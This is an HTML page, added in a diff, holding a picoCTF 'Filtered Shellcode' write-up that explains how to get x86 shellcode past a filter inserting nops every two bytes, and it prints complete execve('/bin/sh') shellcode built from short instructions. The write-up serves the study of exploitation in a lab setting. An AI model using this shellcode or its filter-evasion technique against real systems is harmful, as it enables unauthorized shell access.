@@ -1,0 +1,135 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Filtered Shellcode Writeup</h1>
+            <h2>June 2021</h2>
+            <h4>x86_32 Shellcode with restrictions</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+        A program that just runs the code you give it? That seems kinda boring... <a href=../../docs/pico/fun>fun</a> nc mercury.picoctf.net 28494
+        <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+        This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to and retrieve the flag from using the developed exploit. 
+        <br>
+        The binary has 2 interesting functions, main() and execute(). Mains purpose appears to be to get user input, and pass it on to execute. Execute then performs some operations on our input, and then executes it. Considering the challenge description and that NX is disabled, it is a fair assumption that this is a shellcoding challenge. 
+        <br><br>
+        Figuring out what exactly is done to our shellcode from the disassembly is tedious and difficult, therefore I decided to use a debugger for this. I passed in some A's, and observed what happens to it.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall7_1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Breaking on the 'call eax' instruction in execute() that started executing our shellcode lets us observe what changes were made to it. It seems like the entire shellcode still remains in memory, however every 2 bytes, 2 nop instructions are inserted. This means that every single instruction in our shellcode has to be less than 2 bytes long. Anything longer than that and the instructions will get broken up by the nops and our shellcode will no longer be viable. 
+        <br><br>
+        I decided to start off with standard x86 shellcode that I wrote a while ago. This shellcode just executes execve{'/bin/sh'), and will therefore spawn us a shell on the targer if it successfully executes. Looking at it in objdump also shows us that it is almost correct for our purpose. Only the 2 push instructions in the middle require more than 2 bytes. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall7_2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        After thinking a bit about ways to split this up, I ended up deciding on the following sequence of instructions:
+        <br><br>
+            mov al, 0x2f <br>
+            mov [edx], al <br>
+            inc edx <br>
+            <br>
+        Each one of these individual instructions is only 1-2 bytes long, and by repeating these instructions for each letter of '/bin/sh\x0' we can get the entire string onto the stack for our execve call. 
+        <br>
+        After trying this out, there was however one more issue that I had not considered. The instructions 'push eax' and 'inc edx' are only 1 byte big, which caused the nops to corrupt my shellcode. This however was an easy fix, I just added a nop instruction after every 1 byte opcode. 
+        <br>
+        After extracting the opcodes on https://defuse.ca/online-x86-assembler.htm#disassembly and sending them to the server, we were able to spawn a shell on the target and retrieve the flag. The finished shellcode is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/pico/chall7_3.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+global _start
+section .text
+_start:
+  xor eax, eax
+  xor ecx, ecx
+  xor edx, edx
+  push eax
+  nop
+
+  mov edx, esp
+
+  mov al, 0x2f
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x62
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x69
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x6e
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x2f
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x73
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x68
+  mov [edx], al
+  inc edx
+  nop
+
+  mov al, 0x00
+  mov [edx], al
+  inc edx
+  nop
+
+  xor eax, eax
+  xor edx, edx
+  mov ebx, esp
+  mov al, 0xb
+  int 0x80
+        </code>
+    </pre>
+</div>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
